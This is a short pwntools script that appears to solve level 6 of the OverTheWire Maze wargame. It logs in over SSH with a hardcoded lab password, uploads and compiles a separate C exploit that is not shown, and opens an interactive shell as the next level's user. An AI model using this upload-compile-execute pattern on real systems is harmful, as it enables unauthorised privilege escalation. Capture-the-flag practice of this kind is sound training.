#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 6
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'epheghuoli'
PORT = 2225

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def execute_payload(sh):
    shell = sh.run('/bin/sh')
    shell.sendline("mkdir /tmp/tald6")
    sh.upload_file(b'serverwrapper.c', remote="/tmp/tald6/pwn.c")
    shell.sendline("cd /tmp/tald6; gcc -m32 pwn.c -o pwn")
    time.sleep(0.05)
    w = log.progress("Executing maze 6...")
    sh.set_working_directory(b'/tmp/tald6')
    shell = sh.run(b'./pwn')
    w.success("maze7 shell established")
    shell.interactive()

sh = connect_to_level()
execute_payload(sh)

